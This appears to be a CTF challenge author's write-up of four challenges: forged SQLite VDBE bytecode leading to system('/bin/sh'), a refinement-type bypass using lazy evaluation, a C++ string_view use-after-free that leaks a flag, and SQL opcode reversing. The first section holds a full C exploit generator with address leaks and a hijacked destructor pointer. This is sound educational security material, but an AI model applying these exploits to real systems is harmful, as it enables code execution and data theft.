## SQLite of Hand (co-authored with [mikit](https://x.com/m1kit))

Did you know that SQLite3 compiles an SQL query to an internal bytecode and executes it by its bytecode interpreter? (c.f. https://www.hwaci.com/sw/sqlite/arch.html) The situation is quite similar to CPython and other interpreters. There have been numerous exploitation challenges targeting bytecode engines, and this challenge is another example of them.

In the challenge, you are given a binary that takes a bytecode sequence and executes it:

```c
    char *buf = mmap((void *)MAP_ADDR, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (buf == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    if (sqlite3_open("hello.db", &db) != SQLITE_OK)
    {
        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    if (sqlite3_prepare_v2(db, "select 1;", -1, &stmt, NULL) != SQLITE_OK)
    {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    printf("size> ");
    unsigned n = read_int();
    if (n >= (N_OPs * SIZE_OP))
    {
        puts("too long");
        return 1;
    }
    printf("your bytecode> ");
    readn(buf, n);

    char *target = malloc(N_OPs * SIZE_OP);
    memcpy(target, buf, n);

    // adhoc: stmt->aOp = target
    void **aOp = (void **)((unsigned long long)stmt + 136);
    *aOp = target;

    sqlite3_step((sqlite3_stmt *)stmt);
```

Here, `stmt` is a variable of type `sqlite3_stmt *`, which is a rename of an internally-used struct `Vdbe*` , and represents a VM object. `Vdbe*` object is typically an artifact of compilation of a given SQL by `sqlite3_prepare_XX` , and it contains compiled bytecodes, memory cells, db file handler, and so on. The binary first opens a database, named “hello.db”, and compiles a SQL query `select 1;` . The result of the compilation is saved in the `stmt*` variable. 

The tricky thing is the next part. First, it takes a buffer of size n at mmaped-region`0x2000000000` and copies it to another heap-buffer. Then, it overwrites the pointer at `stmt+136` by the heap-address. Though it’s ad-hoc, with some survey, you may notice that this part is a field `aOp` in the `Vdbe` struct, and therefore, that assignment statement is equivalent to `stmt->aOp = target`. In short, you can change the opcodes of `stmt` to an arbitrary opcode sequence.

### VDBE struct (sqlite3_stmt)

Let us see the internal structure of Vdbe now. 
SQLite's virtual machine is a variant of register machines, where it is equipped with infinite size of memory cells (called registers), and each opcode achieves some pre-determined operations while manipulating registers.

Thus, `Vdbe` struct holds the information to achieve this virtual machine. The important part of Vdbe and auxiliary structs are as follows:

```c
typedef struct Vdbe Vdbe;

// https://github.com/sqlite/sqlite/blob/9f53d0c8179a3b69f788bd31749fc7c15092be87/src/vdbeInt.h#L447-L517
struct Vdbe {
  /** omitted **/
  Mem *aMem;              /* The memory locations */
  Mem **apArg;            /* Arguments to currently executing user function */
  VdbeCursor **apCsr;     /* One element of this array for each open cursor */
  Mem *aVar;              /* Values for the OP_Variable opcode. */

  /* When allocating a new Vdbe object, all of the fields below should be
  ** initialized to zero or NULL */

  Op *aOp;                /* Space to hold the virtual machine's program */
  int nOp;                /* Number of instructions in the program */
  /** omitted **/
}

typedef struct VdbeOp VdbeOp;
// https://github.com/sqlite/sqlite/blob/9f53d0c8179a3b69f788bd31749fc7c15092be87/src/vdbe.h#L54-L93
struct VdbeOp {
  u8 opcode;          /* What operation to perform */
  signed char p4type; /* One of the P4_xxx constants for p4 */
  u16 p5;             /* Fifth parameter is an unsigned 16-bit integer */
  int p1;             /* First operand */
  int p2;             /* Second parameter (often the jump destination) */
  int p3;             /* The third parameter */
  union p4union {     /* fourth parameter */
    int i;                 /* Integer value if p4type==P4_INT32 */
    void *p;               /* Generic pointer */
    /* omitted */
  } p4;
  /* omitted */
};

typedef struct sqlite3_value Mem;
https://github.com/sqlite/sqlite/blob/9f53d0c8179a3b69f788bd31749fc7c15092be87/src/vdbeInt.h#L225-L248
struct sqlite3_value {
  union MemValue {
    double r;           /* Real value used when MEM_Real is set in flags */
    i64 i;              /* Integer value used when MEM_Int is set in flags */
    int nZero;          /* Extra zero bytes when MEM_Zero and MEM_Blob set */
    const char *zPType; /* Pointer type when MEM_Term|MEM_Subtype|MEM_Null */
    FuncDef *pDef;      /* Used only when flags==MEM_Agg */
  } u;
  char *z;            /* String or BLOB value */
  int n;              /* Number of characters in string value, excluding '\0' */
  u16 flags;          /* Some combination of MEM_Null, MEM_Str, MEM_Dyn, etc. */
  u8  enc;            /* SQLITE_UTF8, SQLITE_UTF16BE, SQLITE_UTF16LE */
  u8  eSubtype;       /* Subtype for this value */
  /* ShallowCopy only needs to copy the information above */
  sqlite3 *db;        /* The associated database connection */
  int szMalloc;       /* Size of the zMalloc allocation */
  u32 uTemp;          /* Transient storage for serial_type in OP_MakeRecord */
  char *zMalloc;      /* Space to hold MEM_Str or MEM_Blob if szMalloc>0 */
  void (*xDel)(void*);/* Destructor for Mem.z - only valid if MEM_Dyn */
  /* omitted */
};

```

As we noted above, a Vdbe object has a sequence of memory cells `Mem *aMem` and opcodes `Op *aOp` .  A memory cell object (Mem) is a 56-byte object. It is roughly depicted as 

```c
 0+---------------+----------------+
  | Memory value  | String pointer |
16+---------------+----------------+
  | not important |  not important |
32+---------------+----------------+
  | not important |  not important |
48+---------------+----------------+
  | destructor    |                |
  +---------------+----------------+
```
There are roughly five kinds of value types in SQLite3, and in this writeup, we utilize integer and string values. The important note here is that the places where integer value is located and string pointer is located are different, and therefore, even with type confusion, we cannot obtain an arbitrary address read/write. 

### Opcodes

Various opcodes are implemented in SQLite3 (see https://www.sqlite.org/opcode.html for the full list). We here extract important ones

- OP_IntCopy (p1, p2): copies a memory value from one memory cell to another assuming these memory cells have the integer type (no check)
- OP_Concat(p1, p2, p3): string concatenation p3 := p2 + p1. It can trigger libc's `malloc`.
- OP_AddImm(reg, imm): reg += imm
- OP_String(len, reg, _, str): reg := str
- OP_Goto(_, addr): pc := addr

### Challenges and Exploitation Strategy

The challenges of pwning SQLite3 bytecode interpreter are (as far as I know)

- No ArrayBuffer; We cannot do buf[arbitrary_addr] = arbitrary_value easily (no easy arbitrary address write (AAW))
- Illegal OP_IntCopy cannot overwrite the string buffer’s address, as there are located in a different offset in a single memory cell (+0 vs +8).


Rough overview of my exploitation strategy is to leak the heap address, and creates a fake Op sequence in the heap.
Since the offset to the op sequence is always the same, so we can jump to the fake Op sequence with 100 percent.
Since we have leaked the heap address in the first stage, in the second stage (the fake Op sequence), we can create an opcode with the heap address.
Using this primitive, we can leak the libc address.
Finally, we overwrite the memory cell's destructor function pointer to libc's `system`, and utilize `OP_VCheck` opcode, we can achieve `system("/bin/sh")`.

```c
#include <sqlite3.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>
#include "mylib.c"

#define MAP_ADDR 0x2000000000
#define MEM_Dyn 0x1000

int main()
{

  Op *cur;

  Op *buf = mmap((void *)MAP_ADDR, 0x10000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  if (buf == MAP_FAILED)
  {
    perror("mmap");
    return 1;
  }
  printf("buf: %p\n", buf);

  Op *target = malloc(0x100 * sizeof(Op));

  // **main**
  cur = buf;
  // aux
  i64 value = 0x4142434445;

  Op2(cur++, OP_Init, 0, 1);
  // leak heap address
  // 10: addr of heap
  // 11: addr of libc
  // 12: addr of stack
  int RHEAP = 10;
  int RLIBC = 11;
  int RSTACK = 12;
  int RSQLITE = 13;

  char *dummy = (char *)(buf + 0xf0);

  Op *fake_op2 = buf + 0x20; // for leaking sqlite
  Op *fake_op3 = buf + 0x30; // for leaking libc
  Op *fake_op4 = buf + 0x80; // for executing system("/bin/sh")
  memcpy(dummy, "/bin/sh\x00", 8);
  char *fake_memorycell = dummy + 8;
  memcpy(dummy + 8, &dummy, 8);
  memcpy(dummy + 16, "\xff\xff\xff\xff", 4);
  short flags = MEM_Dyn;
  memcpy(dummy + 20, &flags, 2);
  short remindar = 0;
  memcpy(dummy + 22, &remindar, 2);
  dummy += 0x18;

  memcpy(dummy, "dummy!!\x00", 8);

  // 1. leak heap address
  Op3(cur++, OP_IntCopy, 2, RHEAP, 1);

  // create leak libc address Ops
  Op4(cur++, OP_String, 0x10, 1, 0, fake_op2, P4_STATIC);
  Op2(cur++, OP_Pack, RHEAP, 2);
  Op3(cur++, OP_Concat, 2, 1, 13);
  Op4(cur++, OP_String, 0x800, 1, 0, fake_op2 + 1, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 13, 0);

  Op2(cur++, OP_Goto, 0, 260); // jump to fake op2

  // leak sqlite's lib address
  // values is dummy ( to be overwritten above)
  cur = fake_op2;
  Op4(cur++, OP_Int64, 0, RSQLITE, 0, (u8 *)&value, P4_INT64);
  Op2(cur++, OP_AddImm, RSQLITE, -0x104a80);
  // GOT(getenv)
  Op2(cur++, OP_IntCopy, RSQLITE, 1);
  Op2(cur++, OP_AddImm, 1, 1060864);

  Op2(cur++, OP_Pack, 1, 2);
  Op4(cur++, OP_String, 0x18, 1, 0, (u64)fake_op3 - 0x8, P4_STATIC);
  Op3(cur++, OP_Concat, 2, 1, 13);
  Op4(cur++, OP_String, 0x900, 1, 0, fake_op3 + 1, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 13, 0);

  Op2(cur++, OP_Goto, 0, 349); // jump to fake op3

  // leak libc's address
  cur = fake_op3;
  Op4(cur++, OP_Int64, 0, RLIBC, 0, (u8 *)&value, P4_INT64);
  Op2(cur++, OP_AddImm, RLIBC, -296864);

  int base = 0x26aa0;
  int system_offset = 0x58740;
  int binsh_offset = 0x1b75aa;
  // u (dummy)
  Op4(cur++, OP_String, 72, 9, 0, dummy, P4_STATIC);

  Op4(cur++, OP_String, 0x10 + 8 /* db */ + 4 /* szMalloc */ + 4 /* uTemp */ + 8 /* zMalloc */, 1, 0, (u64)fake_memorycell, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 9, 9);

  Op2(cur++, OP_IntCopy, RLIBC, 1);
  Op2(cur++, OP_AddImm, 1, system_offset);
  Op2(cur++, OP_Pack, 1, 13);
  Op3(cur++, OP_Concat, 13, 9, 9);

  Op4(cur++, OP_String, 0x900, 1, 0, dummy, P4_STATIC);
  Op3(cur++, OP_Concat, 1, 9, 9);

  Op2(cur++, OP_VCheck, 0, 2016);
  Op2(cur++, OP_ResultRow, 9, 1);
  Op2(cur++, OP_Halt, 0, 0);

  // save buf to a file named "pwn"
  FILE *fp = fopen("pwn", "wb");
  fwrite(buf, 0x100 * sizeof(Op), 1, fp);
  fclose(fp);

  return 0;
}
```


## H* [Misc, 4 solves]

In this challenge, a toy-language compiler is provided. The goal is to break the sandbox provided by a "refinement-type" system. A refinement type is a type enhanced by a constraint that restricts elements of the refinement type. For example, `x:: int {x < 0}` is a type of negative integers. `f:: int{x<0} -> int{x > 0}` is a type of unary functions that take negative integers, and return positive integers. A function `\x -> -1 * x` has this type.

A good thing about using such a refinement type system is that we can achieve more precise program analyses. For example, we can prove that the following program will never fail with any assertion-failure for any input `m`.

```ocaml
let rec sum:: x:int{true} -> res:int{res >= x} = \\x -> if x < 1 then 0 else x + sum (x - 1)
let check m = if m > 0 then let res = sum m in assert(m > 0)
```

This kind of precise (context-senstive) analyses cannot be achieved just by some simple type checking.

Now we wish to introduce the challenge H*. A concept of the toy-language H* is to provide a refinement type system for Haskell. To achieve this, the compiler first takes a program in the toy-language and transforms it to an F* program, which is an OCaml-like programming language with a refinement type system. The compiler checks if the program is typeable or not in F*’s type system. If typeable, it generates a corresponding Haskell program, compiles the generated Haskell program with GHC, and executes the binary.

The goal is to break the refinement type system. The server program takes a program in H* language, and attaches the following program fragment with it:

```ocaml
module Main

open FStar.IO
open FStar.All

val flag: x:int{false} -> ML unit
let flag _ = print_string "flag{hello}\n"
val main: unit -> ML unit
let main () = <here is the submitted program>
```

and when generating H*, the following program is attached with the submitted program

```haskell

flag :: Integer -> IO ()
flag x = putStrLn "<flag_is_filled_here>"

main :: IO ()
main = <here is the submitted program>
```

Therefore, the goal is to provide a program that can successfully calls the flag function, but still it is typeable under the above condition. However, `flag` function has type `x:int{false} -> ML unit`, and therefore, the set of the possible arguments for `flag` is empty. Indeed, if you compile the F* program like

```ocaml
module Main

open FStar.IO
open FStar.All

val flag: x:int{false} -> ML unit
let flag _ = print_string "flag{hello}\n"
val main: unit -> ML unit
let main () = flag 1
```

you will encounter the following error

```ocaml
$ fstar.exe Main.fst
Main.fst(10,19-10,20): (Error 19) Subtyping check failed; expected type x: Prims.int{false}; got type Prims.int; The SMT solver could not prove the query, try to spell your proof in more detail or increase fuel/ifuel (see also Main.fst(6,16-6,21))
Verified module: Main
1 error was reported (see above)
```

The crux of this challenge is how to bypass this type check. The intended solution is to utilize the difference of the evaluation orders of OCaml(F*) and Haskell. OCaml adopts the call-by-value evaluation strategy, where for each function application `e₁ e₂`, it first evaluates the argument `e₂` until it is reduced to some value `v`. On the other hand, Haskell is famous for adopting call-by-need (or call-by-name) strategy, where the argument e₂ is not evaluated until it is required. To illustrate the difference, we consider the following OCaml and superficially equivalent Haskell programs

```ocaml
let rec loop () = loop ()
let () = let x = loop () in print_string "hello\n"
```

and

```haskell
loop :: () -> ()
loop () = loop ()

main :: IO ()
main = let x = loop () in  putStrLn "hello"
```

Despite the similar program structures, the execution results are different; the OCaml’s one ends in an infinite loop, but Haskell’s one successfully prints “hello” and terminates.

```haskell
$ ghc loop.hs
[1 of 2] Compiling Main             ( loop.hs, loop.o )
[2 of 2] Linking loop
$ ./loop
hello
$ ocamlc loop.ml -o loop
$ ./loop
^C
```

This is because Haskell does not evaluate `loop ()` as the evaluation result of this part is not used by the further computations, while OCaml naively evaluates the program "in the order of how it is written". 

This difference is in fact, crucial. Since the refinement type system of F* is designed for call-by-value languages, the following program is type-safe:

```ocaml
let flag: x:int{false} -> ML unit = fun _ -> print_string "flag\n"
let rec loop: x:int{true} -> Dv(x:int {false}) = fun x -> loop x
let main: unit -> ML unit = fun _ -> let x = loop 1 in flag x
```

Here, `Dv` is a monad for specifying that the function can be divergent and therefore, termination checking is disabled. Note that if no effect is specified, then the default monad is `Tot`, where the function is required to terminate for any inputs. As proven by the refinement type system, there is no reachable path to calling `flag` function. Therefore, even if you execute this program, it ends in nothing but an infinite loop.

However, as you might expect, the following “equivalent” Haskell program terminates successfully, meaning that the program will dump a flag.

```haskell
flag :: Integer -> IO ()
flag x = putStrLn "TSGCTF{flag}"

loop :: Integer -> Integer
loop = \x -> loop x

main :: IO ()
main =
  let x = loop 1
  in flag x
```

## Cached File Viewer (2) (co-author https://x.com/azaika_) [Misc (Pwn?), 76 solves (ver1),  12 solves (ver2) ]

### TL;DR; string_view’s UAF

See this code snippet.

https://wandbox.org/permlink/2be0CwvJRAXcyNL1

First of all, sorry for the stupid mistake in the first version. We should have noticed that before the CTF. Since in the first version, if you read `flag` twice, since the second item is not marked as “redacted”, you can read the flag easily as follows:

```
❯ nc 34.146.186.1 21001
1. load_file
2. read
3. bye
choice > 1
index > 1
filename > flag
Read 22 bytes.
1. load_file
2. read
3. bye
choice > 1
index > 2
filename > flag
1. load_file
2. read
3. bye
choice > 2
index > 2
content: TSGCTF{!7esuVVz2n@!Fm}
```

This was totally not what we intended [**😔**](https://yaytext.com/emoji/pensive-face/)

Let us move on to talking about the second version. You are given a binary written in C++ (here is a simplified version; we omitted the index check and some non-essential parts):

```cpp
struct Item {
    std::string_view str;
    bool is_redacted;
};

std::unordered_map<std::string, std::string> arena;
Item items[10];

void output_content(const Item& item)
{
    if (item.is_redacted)
        std::cout << "content: **redacted**" << std::endl;
    else
        std::cout << "content: " << item.str << std::endl;
}

std::unique_ptr<std::string> file_reader(const std::string& filename)
{
    std::ifstream file(filename);
    auto content = std::make_unique<std::string>(std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>());
    std::cout << "Read " << size << " bytes." << std::endl;
    return content;
}

void update_items(int index, std::unique_ptr<std::string> content, const std::string& filename)
{
    std::string_view str = *content;
    if (!items[index].str.empty())
    {
        output_content(items[index]);
        std::cout << "Overwrite loaded file? (y/n) > " << std::flush;
        char choice;
        std::cin >> choice;
        if (choice != 'y')
        {
            return;
        }
    }
    items[index].str = str;

    if (filename.find("flag") != std::string::npos)
        items[index].is_redacted = true;
    else
        items[index].is_redacted = false;
    arena[filename] = std::move(*content);
}

void load_file(int index, const std::string& filename)
{
    if (arena.find(filename) != arena.end())
    {
        items[index].str = arena[filename];
        items[index].is_redacted = filename.find("flag") != std::string::npos;
        return;
    }

    auto content = file_reader(filename);
    if (!content) return;

    update_items(index, std::move(content), filename);
}

void read_file(int index)
{
    output_content(items[index]);
}

int main()
{
    int choice;
    int index;
    std::string filename;
    while (true)
    {
        std::cout << "1. load_file\n2. read\n3. bye\nchoice > " << std::flush;
        std::cin >> choice;

        switch (choice)
        {
        case 1:
            std::cout << "index > " << std::flush;
            std::cout << "filename > " << std::flush;
            std::cin >> filename;
            load_file(index, filename);
            break;
        case 2:
            std::cout << "index > " << std::flush;
            read_file(index);
            break;
        default:
            std::cout << "Goodbye!" << std::endl;
            return 0;
        }
    }
}
```

We have an unordered_map `arena`, which is a map from a file name to its file content. To associate indices and contents, we also have a global buffer `items` whose contents are of type `struct Item`. This Item has a flag to check if the content is sensitive (flag or not), and a `string_view`, which is a class for “borrowing a string” (kind of `&str` in Rust in my understanding). In cppreference.com, it is explained as follows:(https://en.cppreference.com/w/cpp/string/basic_string_view)

> The class template `basic_string_view` describes an object that can refer to a constant contiguous sequence of `CharT` with the first element of the sequence at position zero.
> 

Since the lifetime of each string is the same as `arena` (i.e., `'static` so to speak), as long as  `string_view`s in items are taken from the `arena`, they are all valid. Keep this in mind, and let us briefly review the program.

The program is a simple menu program with two options: (i) load_file and (ii) read. Since the read menu is not crucuial for this challenge, we will ignore it in this writeup. `load_file` takes an index and a filename, and loads the file’s content into `items[index]`. The function first checks if a file has already been loaded by scanning `arena`. If found, it uses the existing string in `arena`. Otherwise, `file_reader` reads the content and registers the data via `update_items(index, std::move(content), filename)`. The steps of the function are (i) creating a string view, (ii) setting the string_view to `items[index].str`, (iii) if the filename contains “flag”, then enabling `items[index].is_redacted`, and (iv) moving the content to `arena[filename]`.(Here we omitted the overwrite-check)

The bug lies in ownership and borrow handling in the above steps. Since the created `string_view` points to the original `content`, the string_view’s borrow becomes invalid after moving the content:

```cpp
    std::string_view str = *content;  // str is a borrow of *content
    items[index].str = str;
    arena[filename] = std::move(*content); // the end of *content's "lifetime"
    // items[index].str is now a "dangling pointer"
```

Fortunately, for most cases, this bug is not observable due to the internal implementation of `std::string` and `std::string_view`. `std::string`  can be understood as the triple of a buffer pointer, string length, and buffer capacity. `std::string_view` is also equivalent to a tuple of a pointer to a string buffer and its length. In the line `std::string_view str = *content;` , str is initialized to the pointer to the buffer in `content`. And that buffer is moved to `arena[filename]`. Therefore, even though `str` is outdated in terms of the specification, the whole program works as we intended. Well, at least in most cases.

The exceptional case is when the string buffer is *small enough* (less than 23 bytes this time). In this case,  “Small String Optimization” (maybe well-known for pwners 🙂) takes place, and no heap allocation happens for its string buffer; characters are packed in the std::string structure. In that case, std::string_view points to the `std::string` object itself (not its buffer!), and therefore, after `*content` is moved, and the `std::string`struct is freed,  `std::string_view` points to a buffer that is freed, leading to Use After Free.

The remaining thing is how to leak the flag using this UAF, which is not so hard. You first load a file with 22 bytes, and then load a flag with the same index as the previous. You can find a file with 22 bytes by some random shell commands. An example in the problem container is `/var/lib/dpkg/info/libdb5.3t64:amd64.shlibs`. Finally, we will obtain the flag like this:

```python
$ nc 34.146.186.1 21005
1. load_file
2. read
3. bye
choice > 1
index > 1
filename > /var/lib/dpkg/info/libdb5.3t64:amd64.shlibs
Read 22 bytes.
1. load_file
2. read
3. bye
choice > 1
index > 1
filename > flag
Read 22 bytes.
content: TSGCTF{hQAz-yXc6fLoyK}
```

## Warmup SQLite [Rev, 24 solves]

This is just a simple SQL opcode reversing. You are given the explain result of a query, and your task is to find out what the query is doing. If you carefully see the content of the query, you will notice the structure of loops and arithmetic operations applied to each character.

The original SQL was 

```sql
WITH RECURSIVE
split(input, rest, idx) AS (
    VALUES('', ?, -1)
    UNION ALL
    SELECT
        substr(rest, 1, 1),
        substr(rest, 2),
        idx + 1
    FROM split
    WHERE rest <> ''
),
tr(val, idx, iter) AS (
    SELECT
        unicode(input) AS val,
        idx,
        0 AS iter
    FROM split
    WHERE input <> ''

    UNION ALL

    SELECT
        (tr.val * 7 + 2) % 256,
        idx,
        iter + 1
    FROM tr
    WHERE iter < 10
)
SELECT * from tr WHERE iter = 10 ORDER BY idx;
```

and you can obtain the flag by the following script

```python
import sqlite3
import re
import sys

res = [100, 115, 39, 99, 100, 54, 27, 115, 69, 220, 69, 99, 100, 191, 56, 161, 131, 11, 101, 162, 191, 54, 130, 175, 205, 191, 222, 101, 162, 116, 147, 191, 55, 24, 69, 130, 69, 191, 252, 101, 102, 101, 252, 189, 82, 116, 41, 147, 161, 147, 132, 101, 162, 82, 191, 220, 9, 205, 9, 100, 191, 38, 68, 253]

n = pow(7, -1, 256)
for i in range(10):
    numbers = []
    for x in res:
        m = ((x - 2) * n) % 256
        numbers.append(m)
    res = numbers

print(''.join(map(chr, res)))
```